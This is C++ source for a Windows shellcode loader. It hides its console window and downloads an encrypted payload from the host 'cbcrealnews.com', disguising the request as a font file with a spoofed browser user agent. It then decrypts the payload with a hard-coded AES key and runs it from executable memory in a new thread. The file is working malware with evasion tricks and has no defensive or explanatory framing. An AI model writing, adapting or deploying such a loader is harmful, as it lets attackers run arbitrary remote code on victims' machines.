#include <winternl.h>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "Wininet.lib")
#include <psapi.h>


int AESDecrypt(char* xcode, unsigned int xcode_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)xcode, (DWORD*)&xcode_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

struct Xcode {
	byte* data;
	DWORD len;
};

Xcode Download(LPCWSTR host, INTERNET_PORT port);
void Execute(Xcode xcode);

int main() {

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	Xcode xcode = Download(L"cbcrealnews.com", 80);
	Execute(xcode);

	return 0;
}

Xcode Download(LPCWSTR host, INTERNET_PORT port) {

	HINTERNET session = InternetOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, 0, 0);
	HINTERNET request = HttpOpenRequest(connection, L"GET", L"/CaskaydiaCove.woff", NULL, NULL, NULL, 0, 0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0);
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* xload = (byte*)malloc(capacity);

	DWORD xloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			exit(0);
		}

		if (bytesRead == 0) break;

		if (xloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newXload = (byte*)realloc(xload, capacity);
			xload = newXload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			xload[xloadSize++] = buffer[i];
		}

	}
	byte* newXload = (byte*)realloc(xload, xloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	struct Xcode out;
	out.data = xload;
	out.len = xloadSize;
	return out;
}

unsigned char key[] = { 0x4d, 0x72, 0x7a, 0x66, 0x55, 0x63, 0x6b, 0x57, 0x45, 0x46, 0x32, 0x31, 0x77, 0x65, 0x66, 0x78 };


void Execute(Xcode xcode) {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, xcode.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char*)xcode.data, xcode.len, (char*)key, sizeof(key));

	RtlMoveMemory(exec_mem, xcode.data, xcode.len);
	rv = VirtualProtect(exec_mem, xcode.len, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

}
